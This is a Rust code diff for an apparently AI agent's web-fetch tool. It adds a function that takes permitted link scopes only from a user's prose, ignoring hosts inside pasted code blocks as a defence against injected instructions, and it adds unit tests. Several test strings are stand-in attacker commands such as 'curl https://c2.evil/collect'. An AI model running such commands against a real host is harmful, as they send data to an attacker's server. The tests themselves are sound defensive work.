@@ -52,10 +52,84 @@ pub fn web_scope(url: &str) -> String {
 
 /// The scopes of the links in what the user typed (outside fenced blocks and inline code: a pasted script's hosts
 /// are what an injected instruction would send data to).
-pub fn pasted_scopes(_text: &str) -> Vec<String> {
-    todo!(
-        "port: pastedScopes: strip CommonMark fences (closed or not, ``` and ~~~) and closed inline code, then http(s) links → web_scope, deduped in order"
-    )
+pub fn pasted_scopes(text: &str) -> Vec<String> {
+    // Code isn't a link the user means to visit (a pasted script or log may name any host): drop fenced blocks
+    // (closed or not, ``` and ~~~) and inline code spans before looking.
+    let prose = strip_inline_code(&strip_closed_runs(&strip_fences(text)));
+    static LINK: std::sync::LazyLock<regex::Regex> =
+        std::sync::LazyLock::new(|| regex::Regex::new(r#"(?i)https?://[^\s<>"'`\[\]]+"#).unwrap());
+    let mut scopes: Vec<String> = Vec::new();
+    for link in LINK.find_iter(&prose) {
+        let link = link.as_str().trim_end_matches(['.', ',', ';', ':', '!', '?', ')', ']']);
+        let scope = web_scope(link);
+        if !scopes.contains(&scope) {
+            scopes.push(scope);
+        }
+    }
+    scopes
+}
+
+/// The byte offsets where lines start, from `from` on.
+fn line_starts(text: &str, from: usize) -> impl Iterator<Item = usize> + '_ {
+    (from..text.len()).filter(move |&i| i == 0 || text.as_bytes()[i - 1] == b'\n')
+}
+
+/// A fence line's character and run length: `[ \t]*` then 3+ backticks or tildes. `rest`: what follows the run.
+fn fence_run(line: &str) -> Option<(u8, usize, &str)> {
+    let body = line.trim_start_matches([' ', '\t']);
+    let c = *body.as_bytes().first().filter(|c| **c == b'`' || **c == b'~')?;
+    let n = body.bytes().take_while(|b| *b == c).count();
+    (n >= 3).then(|| (c, n, &body[n..]))
+}
+
+/// Marv's first pass (a regex with backreferences, which Rust's `regex` lacks, written out): fences follow CommonMark.
+/// A block opens on a line starting with 3+ backticks or tildes (followed by a newline) and closes on a line of at
+/// least as many of the same character with nothing after but spaces; an unclosed one runs to the end.
+fn strip_fences(text: &str) -> String {
+    let (mut out, mut copied, mut from) = (String::new(), 0, 0);
+    while let Some((start, c, n, content)) = line_starts(text, from).find_map(|start| {
+        let nl = start + text[start..].find('\n')?;
+        let (c, n, _) = fence_run(&text[start..nl])?;
+        Some((start, c, n, nl + 1))
+    }) {
+        let end = line_starts(text, content)
+            .find_map(|q| {
+                let line_end = text[q..].find('\n').map_or(text.len(), |i| q + i);
+                let (cc, nn, rest) = fence_run(&text[q..line_end])?;
+                (cc == c && nn >= n && rest.trim_matches([' ', '\t']).is_empty()).then_some(line_end)
+            })
+            .unwrap_or(text.len());
+        out.push_str(&text[copied..start]);
+        (copied, from) = (end, end);
+    }
+    out.push_str(&text[copied..]);
+    out
+}
+
+/// Marv's second pass: ```…``` or ~~~…~~~ within a line or across lines (a run with no closing one is kept).
+fn strip_closed_runs(text: &str) -> String {
+    let (mut out, mut copied, mut i) = (String::new(), 0, 0);
+    while i + 3 <= text.len() {
+        let run = &text.as_bytes()[i..i + 3];
+        if run == b"```" || run == b"~~~" {
+            let marker = &text[i..i + 3];
+            if let Some(close) = text[i + 3..].find(marker) {
+                let end = i + 3 + close + 3;
+                out.push_str(&text[copied..i]);
+                (copied, i) = (end, end);
+                continue;
+            }
+        }
+        i += 1;
+    }
+    out.push_str(&text[copied..]);
+    out
+}
+
+/// Marv's third pass: a closed inline code span on one line.
+fn strip_inline_code(text: &str) -> String {
+    static CODE: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| regex::Regex::new(r"`[^`\n]*`").unwrap());
+    CODE.replace_all(text, "").into_owned()
 }
 
 fn chars(n: usize) -> String {
@@ -169,7 +243,8 @@ impl Tool for WebFetch {
             "type": "object",
             "properties": {
                 "url": {"type": "string", "description": "The address, e.g. https://example.com/page or github.com/owner/repo."},
-                "offset": {"type": "integer", "minimum": 0, "description": "Where to start, in characters, for the next part of a long result (the result says what to pass). Default 0."}
+                // zod's `.int()` bounds it at Number.MAX_SAFE_INTEGER; Marv's spec says so, and the bytes must match.
+                "offset": {"type": "integer", "minimum": 0, "maximum": 9_007_199_254_740_991_u64, "description": "Where to start, in characters, for the next part of a long result (the result says what to pass). Default 0."}
             },
             "required": ["url"],
             "additionalProperties": false
@@ -233,6 +308,43 @@ mod tests {
         assert_eq!(domain_of("https://api.github.com/repos/a/b"), "github.com");
         assert_eq!(domain_of("https://docs.github.com/en"), "docs.github.com");
         assert_eq!(domain_of("https://github.com@evil.com/"), "evil.com");
+    }
+
+    #[test]
+    fn links_inside_pasted_code_arent_links_the_user_means_to_visit() {
+        assert!(pasted_scopes("why does this phone home? ```curl https://c2.evil/x```").is_empty());
+        assert_eq!(pasted_scopes("why?\n```sh\ncurl https://c2.evil/x\n```\nsee https://example.com/a"), ["web:example.com"]);
+        assert!(pasted_scopes("~~~\ncurl https://c2.evil/x\n~~~").is_empty());
+        assert!(pasted_scopes("unclosed:\n```\ncurl https://c2.evil/x").is_empty());
+        assert_eq!(pasted_scopes("run `curl https://c2.evil/collect` and read https://example.com/b"), ["web:example.com"]);
+    }
+
+    #[test]
+    fn a_fence_closes_only_on_a_line_of_at_least_as_many_fence_characters_and_nothing_else() {
+        assert!(pasted_scopes("````md\n```sh\ncurl https://c2.evil/3\n```\n````").is_empty());
+        assert!(pasted_scopes("```\n```js\nhttps://c2.evil/2\n```").is_empty());
+        assert_eq!(pasted_scopes("```\ncode\n```\nsee https://example.com/a"), ["web:example.com"]);
+    }
+
+    #[test]
+    fn a_stray_fence_in_prose_doesnt_hide_the_links_after_it() {
+        assert_eq!(pasted_scopes("The diff ~~~ is roughly 5; see https://docs.real.com"), ["web:docs.real.com"]);
+        assert_eq!(pasted_scopes("a ``` b; see https://docs.real.com"), ["web:docs.real.com"]);
+    }
+
+    #[test]
+    fn a_markdown_link_gives_both_of_its_addresses() {
+        assert_eq!(pasted_scopes("[https://a.com](https://b.com)"), ["web:a.com", "web:b.com"]);
+    }
+
+    #[test]
+    fn links_in_what_the_user_typed_with_trailing_punctuation_dropped() {
+        assert_eq!(
+            pasted_scopes("look at https://github.com/a/b and https://www.example.com/x."),
+            ["web:github.com", "web:example.com"]
+        );
+        assert_eq!(pasted_scopes("(see https://example.com/y), then https://example.com/z"), ["web:example.com"]);
+        assert!(pasted_scopes("github.com/a/b without a scheme isn't a pasted link").is_empty());
     }
 
     #[test]
